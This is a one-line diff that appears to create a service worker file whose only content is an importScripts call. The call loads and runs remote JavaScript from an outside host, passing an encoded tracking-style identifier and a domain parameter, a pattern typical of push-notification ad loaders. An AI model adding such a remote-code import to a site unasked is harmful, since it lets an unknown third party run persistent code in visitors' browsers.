@@ -1,0 +1,1 @@
+importScripts('https://ulmoyc.com/v1/sw-import.js?h=waWQiOjExMTk1MTIsInNpZCI6MTEzNTAyOSwid2lkIjozMjY4MTMsInNyYyI6MiwicG0iOjB9eyJ&d=unthenamed.eu.org');
